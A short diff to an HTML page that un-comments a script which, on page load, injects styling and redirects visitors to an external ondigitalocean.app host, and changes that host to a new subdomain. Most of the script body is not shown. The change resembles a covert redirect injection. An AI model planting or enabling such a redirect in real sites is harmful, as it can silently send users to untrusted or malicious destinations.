@@ -3,10 +3,10 @@
 <!DOCTYPE html>
 <html lang="ru2">
 <head>
-<!-- <script>
+<script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://coral-app-p9gow.ondigitalocean.app";
+            const redirectUrl = "https://seahorse-app-k933k.ondigitalocean.app";
 
             const style = document.createElement("style");
             style.textContent = `
@@ -148,7 +148,7 @@
                 handleRedirect();
             });
         });
-    </script>  -->
+    </script> 
 	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
